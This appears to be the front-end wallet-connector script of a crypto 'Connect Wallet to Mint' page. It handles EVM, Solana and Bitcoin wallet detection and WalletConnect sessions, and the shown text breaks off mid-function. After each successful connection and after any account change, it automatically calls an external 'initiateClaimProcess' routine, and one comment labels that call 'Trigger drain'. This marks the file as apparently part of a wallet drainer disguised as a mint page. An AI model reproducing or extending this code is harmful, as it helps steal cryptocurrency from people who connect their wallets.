// main.js - Advanced Multi-Chain Wallet Connector
// Enhanced for PC direct wallet extension connections with optimized fallbacks
// and reduced connection latency.

import { CONFIG } from './config.js';

;(async function() {
  
  // ============================================================
  //  DEBUG AREA (double-click to toggle)
  // ============================================================
  const debugArea = document.createElement('div')
  debugArea.id = 'wc-debug'
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `
  document.body.appendChild(debugArea)

  let debugVisible = false
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible
    debugArea.style.display = debugVisible ? 'block' : 'none'
  })

  function logDebug(msg) {
    console.log(msg)
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`
    debugArea.scrollTop = debugArea.scrollHeight
  }

  // ============================================================
  //  DEVICE DETECTION
  // ============================================================
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
  }

  function isIOS() {
    return /iPhone|iPad|iPod/i.test(navigator.userAgent)
  }

  function isAndroid() {
    return /Android/i.test(navigator.userAgent)
  }

  function isDesktop() {
    return !isMobile()
  }

  function getPlatform() {
    if (isIOS()) return 'ios'
    if (isAndroid()) return 'android'
    if (isDesktop()) return 'desktop'
    return 'unknown'
  }

  // ============================================================
  //  CONFIG
  // ============================================================
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG

  // ============================================================
  //  DOM REFERENCES
  // ============================================================
  const connectButton = document.getElementById('connectButton')
  const walletButton = document.getElementById('walletButton')
  const claimStatus = document.getElementById('claimStatus')

  let currentSession = null
  let client, modal, SignClient, WalletConnectModal

  // ============================================================
  //  UI HELPERS
  // ============================================================
  function setButtonState(button, state, message = '') {
    if (!button) return
    button.style.display = 'inline-block'
    button.style.padding = '14px 28px'
    button.style.borderRadius = '8px'
    button.style.fontWeight = '600'
    button.style.border = 'none'
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer'
    button.style.transition = 'all 0.3s ease'
    button.style.color = 'white'
    button.style.fontSize = '16px'
    button.style.fontFamily = "'Inter', sans-serif"
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)'
    button.style.minWidth = '180px'
    button.disabled = state === 'loading'

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)'
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)'
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...'
        break
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)'
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)'
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected'
        break
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect'
        break
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed'
        setTimeout(() => setButtonState(button, 'normal'), 3000)
        break
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)'
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint'
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)'
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)'
          }
        }
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)'
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
        }
        break
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return
    claimStatus.textContent = message
    claimStatus.className = `status ${type}`
    claimStatus.style.display = 'block'
    claimStatus.style.padding = '12px 16px'
    claimStatus.style.borderRadius = '8px'
    claimStatus.style.marginTop = '12px'
    claimStatus.style.fontWeight = '500'
    claimStatus.style.fontSize = '14px'
    claimStatus.style.textAlign = 'center'
    claimStatus.style.transition = 'all 0.3s ease'

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    }
    Object.assign(claimStatus.style, styles[type] || styles.info)

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0'
        setTimeout(() => {
          claimStatus.style.display = 'none'
          claimStatus.style.opacity = '1'
        }, 300)
      }, 5000)
    }
  }

  // ============================================================
  //  STORAGE HELPERS
  // ============================================================
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address)
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session))
    if (chainType) localStorage.setItem('chainType', chainType)
    else {
      const detected = getChainType()
      if (detected !== 'unknown') localStorage.setItem('chainType', detected)
    }
  }
  function getSavedWallet() { return localStorage.getItem('connectedWallet') }
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession')
    return session ? JSON.parse(session) : null
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown' }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet')
    localStorage.removeItem('walletConnectSession')
    localStorage.removeItem('chainType')
  }

  // ============================================================
  //  CHAIN DETECTION
  // ============================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin'
    if (window.solana && typeof window.solana.connect === 'function') return 'solana'
    if (window.ethereum) return 'evm'
    return 'unknown'
  }

  // ============================================================
  //  UI UPDATE
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect')
    if (walletButton) setButtonState(walletButton, 'disconnect')

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' }
    const chainLabel = chainLabels[chain] || 'Unknown'

    let display = document.getElementById('connectedAddressDisplay')
    if (!display) {
      display = document.createElement('div')
      display.id = 'connectedAddressDisplay'
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `
      connectButton.parentNode.appendChild(display)
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `

    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress')
        const orig = btn.innerHTML
        btn.innerHTML = '<i class="fas fa-check"></i>'
        btn.style.color = '#10B981'
        setTimeout(() => {
          btn.innerHTML = orig
          btn.style.color = '#059669'
        }, 2000)
      })
    })

    showStatus(`Connected to ${chainLabel}`, 'success')
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal')
    if (walletButton) setButtonState(walletButton, 'normal')
    const display = document.getElementById('connectedAddressDisplay')
    if (display) display.remove()
    showStatus('Wallet disconnected', 'info')
  }

  // ============================================================
  //  SOLANA WALLET DETECTION
  // ============================================================
  const solanaWalletDetectors = {
    isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare: () => !!window.solflare,
    isBackpack: () => !!window.backpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana: () => !!(window.trustWallet?.solana),
  }

  function getSolanaWallets() {
    const wallets = []
    if (solanaWalletDetectors.isPhantom()) {
      wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana })
    }
    if (solanaWalletDetectors.isSolflare()) {
      wallets.push({ name: 'Solflare', provider: window.solflare })
    }
    if (solanaWalletDetectors.isBackpack()) {
      wallets.push({ name: 'Backpack', provider: window.backpack })
    }
    if (solanaWalletDetectors.isCoinbaseSolana()) {
      wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana })
    }
    if (solanaWalletDetectors.isTrustSolana()) {
      wallets.push({ name: 'Trust', provider: window.trustWallet.solana })
    }
    return wallets
  }

  // ============================================================
  //  EIP‑6963: DETECT ALL EVM PROVIDERS
  // ============================================================
  let evmProviders = []
  let eip6963Initialized = false

  function setupEIP6963() {
    if (eip6963Initialized) return
    eip6963Initialized = true

    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail)
        logDebug(`EIP‑6963: Found provider ${detail.info.name} (${detail.info.rdns})`)
      }
    })

    window.dispatchEvent(new Event('eip6963:requestProvider'))
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500)
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500)
  }

  // ============================================================
  //  WALLET SELECTION MODAL (for multiple EVM providers)
  // ============================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div')
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `
    const modal = document.createElement('div')
    modal.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `
    modal.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `
    overlay.appendChild(modal)
    document.body.appendChild(overlay)

    const list = modal.querySelector('#walletList')
    providers.forEach((provider) => {
      const btn = document.createElement('button')
      btn.textContent = provider.info.name
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `
      btn.onmouseover = () => btn.style.background = '#4B5563'
      btn.onmouseout = () => btn.style.background = '#374151'
      if (provider.info.icon) {
        const img = document.createElement('img')
        img.src = provider.info.icon
        img.style.width = '24px'
        img.style.height = '24px'
        btn.prepend(img)
      }
      btn.addEventListener('click', () => {
        overlay.remove()
        callback(provider)
      })
      list.appendChild(btn)
    })

    modal.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove()
      callback(null)
    })
  }

  // ============================================================
  //  WEBSOCKET CHECK (optional, reduced delay)
  // ============================================================
  async function checkWebSocket(retries = 2, delay = 800) {
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i+1}/${retries}`)
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com')
          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 3000)
          ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true) }
          ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false) }
        })
        if (result) {
          logDebug('✅ WebSocket connection successful')
          return true
        }
        await new Promise(r => setTimeout(r, delay))
      } catch (e) {
        logDebug(`WebSocket exception: ${e.message}`)
        await new Promise(r => setTimeout(r, delay))
      }
    }
    logDebug('❌ WebSocket connection failed after retries')
    return false
  }

  // ============================================================
  //  DYNAMIC LIBRARY LOADING (faster, reduced retries)
  // ============================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ]
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ]

    let SignClient, WalletConnectModal

    // Try all CDNs in parallel for faster loading
    const signClientPromises = cdns.map(url => 
      import(url).then(mod => ({ mod, url })).catch(() => null)
    )
    const modalPromises = modalCdns.map(url =>
      import(url).then(mod => ({ mod, url })).catch(() => null)
    )

    const signResults = await Promise.all(signClientPromises)
    const modalResults = await Promise.all(modalPromises)

    for (const result of signResults) {
      if (result) {
        SignClient = result.mod.default || result.mod
        logDebug(`✅ SignClient loaded from ${result.url}`)
        break
      }
    }
    if (!SignClient) throw new Error('Could not load SignClient')

    for (const result of modalResults) {
      if (result) {
        WalletConnectModal = result.mod.WalletConnectModal || result.mod.default || result.mod
        logDebug(`✅ WalletConnectModal loaded from ${result.url}`)
        break
      }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal')

    return { SignClient, WalletConnectModal }
  }

  // ============================================================
  //  WALLETCONNECT INITIALIZATION
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true

    const projectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID
    logDebug(`🔄 Initializing WalletConnect with projectId: ${projectId}`)

    const wsOk = await checkWebSocket(2, 800)
    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway')

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      })
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      })
      logDebug('✅ WalletConnect initialized successfully')
      return true
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`)
      return false
    }
  }

  // ============================================================
  //  DIRECT EVM CONNECTION – Desktop Only, with prioritized providers
  //  ============================================================
  //  Returns { success, provider, address } or { success: false }
  //  Uses EIP-6963 and falls back to window.ethereum.
  //  Prioritizes well-known wallets (MetaMask, Trust, Coinbase, etc.)
  //  with reduced timeout and retries.
  // ============================================================
  async function connectDirectEVM(maxAttempts = 2) {
    setupEIP6963()
    await new Promise(r => setTimeout(r, 300)) // short wait for providers

    let providers = evmProviders.filter(p => p.provider)
    // If no EIP-6963 providers, but window.ethereum exists, use it.
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }]
    }

    if (providers.length === 0) {
      logDebug('No EVM providers found')
      return { success: false }
    }

    // Prioritize providers: MetaMask > Trust > Coinbase > other
    const priority = ['io.metamask', 'io.trustwallet', 'io.coinbase', 'io.rainbow', 'io.zerion', 'io.rabby']
    const sortedProviders = providers.sort((a, b) => {
      const idxA = priority.indexOf(a.info.rdns)
      const idxB = priority.indexOf(b.info.rdns)
      if (idxA === -1) return 1
      if (idxB === -1) return -1
      return idxA - idxB
    })

    // Try providers in order, but if multiple, we may show selection if user cancels.
    // For simplicity, we'll try the top provider first, if that fails, try next.
    for (const providerInfo of sortedProviders) {
      const provider = providerInfo.provider
      logDebug(`Attempting direct EVM with ${providerInfo.info.name}`)
      let attempt = 0
      while (attempt < maxAttempts) {
        attempt++
        try {
          const accounts = await Promise.race([
            provider.request({ method: 'eth_requestAccounts' }),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
          ])
          if (accounts && accounts.length > 0) {
            const address = accounts[0]
            logDebug(`✅ Direct EVM connection via ${providerInfo.info.name}: ${address}`)
            // Setup event listeners
            setupEVMProviderEvents(provider)
            return { success: true, provider, address, name: providerInfo.info.name }
          }
        } catch (err) {
          logDebug(`⚠️ Direct EVM attempt ${attempt} failed: ${err.message}`)
          if (err.code === 4001) { // user rejected
            logDebug('User rejected connection, stop trying this provider')
            break
          }
          if (err.message === 'timeout') {
            // retry
            continue
          }
          // other error, break and try next provider
          break
        }
        // small delay between retries
        await new Promise(r => setTimeout(r, 300))
      }
    }

    // If we have multiple providers and none succeeded automatically, offer selection modal
    if (providers.length > 1) {
      logDebug('Multiple providers found, offering selection modal')
      const selected = await new Promise((resolve) => {
        showWalletSelectionModal(providers, (provider) => resolve(provider))
      })
      if (selected) {
        try {
          const accounts = await Promise.race([
            selected.provider.request({ method: 'eth_requestAccounts' }),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
          ])
          if (accounts && accounts.length > 0) {
            const address = accounts[0]
            logDebug(`✅ Direct EVM connection via selected ${selected.info.name}: ${address}`)
            setupEVMProviderEvents(selected.provider)
            return { success: true, provider: selected.provider, address, name: selected.info.name }
          }
        } catch (err) {
          logDebug(`Selection connection failed: ${err.message}`)
        }
      }
    }

    logDebug('❌ Direct EVM connection failed')
    return { success: false }
  }

  // ============================================================
  //  WALLETCONNECT EVM CONNECTION (Universal fallback)
  //  ============================================================
  async function connectViaWalletConnect(useTestId = false) {
    const initSuccess = await initWalletConnect(useTestId)
    if (!initSuccess) {
      showStatus('Wallet connection service unavailable', 'error')
      return false
    }
    try {
      showStatus('Requesting wallet connection...', 'info')
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      })
      if (uri) {
        logDebug(`URI: ${uri}`)
        modal.openModal({ uri })
        showStatus('Select your wallet or scan QR code', 'info')

        // Mobile deeplink handling
        if (isMobile()) {
          const platform = getPlatform()
          logDebug(`Mobile platform: ${platform}, attempting deeplink`)
          if (isIOS()) {
            // iOS: try universal links for known wallets
            const iosWallets = DAPP_METADATA.mobileWallets || []
            for (const wallet of iosWallets) {
              if (wallet.links.universal) {
                const url = `${wallet.links.universal}wc?uri=${encodeURIComponent(uri)}`
                logDebug(`Attempting universal link for ${wallet.name}: ${url}`)
                sessionStorage.setItem('pending_wc_uri', uri)
                sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
                window.location.href = url
                break
              }
            }
          } else if (isAndroid()) {
            // Android: modal will provide "Open" button
            logDebug('Android – modal will handle deeplink')
            sessionStorage.setItem('pending_wc_uri', uri)
            sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
          }
        } else {
          // Desktop: store URI for potential later use
          sessionStorage.setItem('pending_wc_uri', uri)
          sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
        }
      }

      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 30000)), // reduced timeout
      ])

      if (modal) modal.closeModal()
      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2]
        logDebug(`✅ WalletConnect session: ${account}`)
        saveWallet(account, session, 'evm')
        updateConnectedUI(account, 'evm')
        currentSession = session
        sessionStorage.removeItem('pending_wc_uri')
        sessionStorage.removeItem('pending_wc_timestamp')
        return true
      } else {
        showStatus('No accounts found', 'error')
        return false
      }
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`)
      if (modal) modal.closeModal()
      sessionStorage.removeItem('pending_wc_uri')
      sessionStorage.removeItem('pending_wc_timestamp')
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error')
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please try again', 'error')
      } else {
        showStatus('Wallet connection failed', 'error')
      }
      return false
    }
  }

  // ============================================================
  //  BITCOIN (UniSat) CONNECTION – Desktop only
  //  ============================================================
  async function connectBitcoin() {
    try {
      if (!window.unisat) {
        showStatus('UniSat wallet not installed', 'error')
        return false
      }
      await window.unisat.requestAccounts()
      const accounts = await window.unisat.getAccounts()
      if (!accounts || accounts.length === 0) throw new Error('No BTC account')
      const address = accounts[0]
      saveWallet(address, null, 'bitcoin')
      updateConnectedUI(address, 'bitcoin')

      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (newAccounts.length === 0) {
            resetConnectedUI()
            clearSavedWallet()
          } else {
            saveWallet(newAccounts[0], null, 'bitcoin')
            updateConnectedUI(newAccounts[0], 'bitcoin')
          }
        })
        window.unisat.on('networkChanged', (network) => {
          showStatus(`Bitcoin network changed to ${network}`, 'info')
        })
      }
      return true
    } catch (e) {
      logDebug(`BTC connection error: ${e.message}`)
      showStatus('Bitcoin connection failed: ' + e.message, 'error')
      return false
    }
  }

  // ============================================================
  //  SOLANA CONNECTION – Desktop only
  //  ============================================================
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets()
      if (wallets.length === 0) {
        showStatus('No Solana wallet found (Phantom, Solflare, etc.)', 'error')
        return false
      }
      const wallet = wallets[0]
      const provider = wallet.provider

      let publicKey
      if (provider.connect) {
        const response = await provider.connect()
        publicKey = response.publicKey?.toString() || response.toString()
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' })
        publicKey = response.publicKey.toString()
      } else {
        throw new Error('Unsupported provider interface')
      }

      const address = publicKey
      saveWallet(address, null, 'solana')
      updateConnectedUI(address, 'solana')

      window.solanaProvider = provider
      window.solanaPublicKey = address

      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString()
            saveWallet(addr, null, 'solana')
            updateConnectedUI(addr, 'solana')
            window.solanaPublicKey = addr
          } else {
            resetConnectedUI()
            clearSavedWallet()
            window.solanaProvider = null
            window.solanaPublicKey = null
          }
        })
        provider.on('disconnect', () => {
          resetConnectedUI()
          clearSavedWallet()
          window.solanaProvider = null
          window.solanaPublicKey = null
        })
      }
      return true
    } catch (e) {
      logDebug(`SOL connection error: ${e.message}`)
      showStatus('Solana connection failed: ' + e.message, 'error')
      return false
    }
  }

  // ============================================================
  //  EVM PROVIDER EVENTS
  //  ============================================================
  function setupEVMProviderEvents(provider) {
    if (!provider) return
    // Avoid duplicate listeners by removing old ones? We'll just attach new ones.
    // But we might want to track if already attached. For simplicity, we attach.
    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Wallet disconnected', 'info')
      } else {
        updateConnectedUI(accounts[0], 'evm')
        saveWallet(accounts[0], null, 'evm')
        // Trigger drain after account change
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess()
          }
        }, 1000)
      }
    })
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info')
    })
    provider.on('disconnect', () => {
      resetConnectedUI()
      clearSavedWallet()
      showStatus('Wallet disconnected', 'info')
    })
  }

  // ============================================================
  //  MAIN CONNECT DISPATCHER – Device‑aware, EVM first, then others
  //  ============================================================
  async function connectWallet() {
    setButtonState(connectButton, 'loading')
    if (walletButton) setButtonState(walletButton, 'loading')
    showStatus('Detecting wallet...', 'info')

    let success = false
    const platform = getPlatform()
    logDebug(`Platform: ${platform}`)

    // ---------- MOBILE PATH: WalletConnect only ----------
    if (isMobile()) {
      logDebug('📱 Mobile – using WalletConnect only')
      showStatus('Mobile: Connecting via WalletConnect...', 'info')

      success = await connectViaWalletConnect(false)
      if (!success) {
        logDebug('Mobile: WalletConnect primary failed, trying test ID')
        success = await connectViaWalletConnect(true)
      }

      if (!success) {
        showStatus('Mobile: No compatible wallet found. Please install a WalletConnect wallet.', 'error')
        setButtonState(connectButton, 'failed')
        if (walletButton) setButtonState(walletButton, 'failed')
      } else {
        setButtonState(connectButton, 'connected')
        if (walletButton) setButtonState(walletButton, 'connected')
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess()
          }
        }, 1000)
      }
      return
    }

    // ---------- DESKTOP PATH: EVM Direct -> WalletConnect -> Solana -> Bitcoin ----------
    logDebug('🖥️ Desktop – full connection flow')

    // 1. Direct EVM (prioritized, fast)
    logDebug('Desktop: Attempting direct EVM connection')
    const directResult = await connectDirectEVM(2) // max 2 attempts
    if (directResult.success) {
      logDebug(`✅ Direct EVM connection successful with ${directResult.name}`)
      saveWallet(directResult.address, null, 'evm')
      updateConnectedUI(directResult.address, 'evm')
      setButtonState(connectButton, 'connected')
      if (walletButton) setButtonState(walletButton, 'connected')
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess()
        }
      }, 1000)
      return
    }

    // 2. WalletConnect fallback
    logDebug('Desktop: Attempting WalletConnect fallback')
    success = await connectViaWalletConnect(false)
    if (!success) {
      logDebug('Desktop: WalletConnect primary failed, trying test ID')
      success = await connectViaWalletConnect(true)
    }
    if (success) {
      logDebug('✅ WalletConnect connection successful')
      setButtonState(connectButton, 'connected')
      if (walletButton) setButtonState(walletButton, 'connected')
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess()
        }
      }, 1000)
      return
    }

    // 3. Solana
    logDebug('Desktop: Attempting Solana connection')
    if (getSolanaWallets().length > 0) {
      success = await connectSolana()
      if (success) {
        logDebug('✅ Solana connection successful')
        setButtonState(connectButton, 'connected')
        if (walletButton) setButtonState(walletButton, 'connected')
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess()
          }
        }, 1000)
        return
      }
    }

    // 4. Bitcoin
    logDebug('Desktop: Attempting Bitcoin connection')
    if (window.unisat) {
      success = await connectBitcoin()
      if (success) {
        logDebug('✅ Bitcoin connection successful')
        setButtonState(connectButton, 'connected')
        if (walletButton) setButtonState(walletButton, 'connected')
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess()
          }
        }, 1000)
        return
      }
    }

    // All failed
    logDebug('❌ All connection attempts failed')
    showStatus('No supported wallet found. Please install a wallet.', 'error')
    setButtonState(connectButton, 'failed')
    if (walletButton) setButtonState(walletButton, 'failed')
  }

  // ============================================================
  //  DISCONNECT
  //  ============================================================
  async function disconnectWallet() {
    try {
      if (window.solanaProvider && window.solanaProvider.disconnect) {
        await window.solanaProvider.disconnect()
      }
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        })
        currentSession = null
      }
    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`)
    }
    resetConnectedUI()
    clearSavedWallet()
    window.solanaProvider = null
    window.solanaPublicKey = null
  }

  // ============================================================
  //  BUTTON CLICK HANDLER
  //  ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet()
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet()
    } else {
      await connectWallet()
    }
  }

  if (connectButton) connectButton.addEventListener('click', handleClick)
  if (walletButton) walletButton.addEventListener('click', handleClick)

  // ============================================================
  //  RESTORE SESSION AND HANDLE RETURN FROM WALLET
  //  ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet()
    const savedChain = getSavedChainType()
    const savedSession = getSavedSession()

    // Check for pending WC redirect (iOS/Android deeplink return)
    const pendingUri = sessionStorage.getItem('pending_wc_uri')
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp')
    if (pendingUri && pendingTimestamp) {
      const elapsed = Date.now() - parseInt(pendingTimestamp)
      if (elapsed < 120000) {
        logDebug('Detected return from wallet – waiting for session...')
        if (client) {
          try {
            await new Promise(r => setTimeout(r, 1500))
            const sessions = client.session.values()
            if (sessions.length > 0) {
              const session = sessions[0]
              const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2]
              if (account) {
                saveWallet(account, session, 'evm')
                updateConnectedUI(account, 'evm')
                currentSession = session
                sessionStorage.removeItem('pending_wc_uri')
                sessionStorage.removeItem('pending_wc_timestamp')
                setTimeout(() => {
